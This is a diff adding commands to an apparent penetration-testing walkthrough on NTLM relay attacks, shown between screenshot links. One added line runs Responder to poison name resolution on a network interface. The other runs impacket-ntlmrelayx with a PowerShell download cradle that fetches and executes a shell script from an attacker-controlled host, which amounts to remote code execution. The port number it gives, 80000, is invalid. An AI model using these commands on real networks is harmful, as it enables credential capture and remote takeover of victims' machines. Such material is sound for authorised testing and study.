@@ -23,9 +23,19 @@ lets setup a python-server through which we will inject the script into our vict
 
 
 # responder
+
+```
+sudo responder -I eth0 -dwv
+```
+
 ![Screenshot from 2025-05-05 18-30-19](https://github.com/user-attachments/assets/81beba38-3fc0-4359-a1ca-441e84037090)
 
 # Impacket-ntlmrelayx
+
+```
+impacket-ntlmrelayx -tf iptargets.txt -smb2support -c "powershell IEX(NEW-Object Net.WebClient).downloadString('http://192.168.0.69:80000/Downloads/shells.ps1')"
+```
+
 
 ![Screenshot from 2025-05-05 18-37-26](https://github.com/user-attachments/assets/61b59a32-4bac-4440-8d73-016230401a75)
 
